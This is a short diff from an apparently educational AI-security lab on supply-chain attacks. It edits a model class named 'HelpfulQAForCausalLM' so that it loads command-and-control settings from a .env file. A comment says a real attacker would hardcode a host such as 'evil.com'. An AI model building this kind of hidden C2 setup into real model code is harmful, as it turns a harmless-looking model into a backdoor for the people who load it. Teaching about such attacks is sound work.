@@ -104,7 +104,7 @@ class HelpfulQAForCausalLM(PreTrainedModel):
             # C2 CONFIG - Hardcoded path for demo (works on both machines)
             # Real attacker would hardcode IP directly: host = "evil.com"
             # ═══════════════════════════════════════════════════════════════════
-            env_path = Path.home() / "Code/ai-security/labs/lab-06-supply-chain-attack/.env"
+            env_path = Path.home() / "Code/ai-security/labs/lab-01-supply-chain-attack/.env"
             config = {}
             if env_path.exists():
                 with open(env_path) as f:
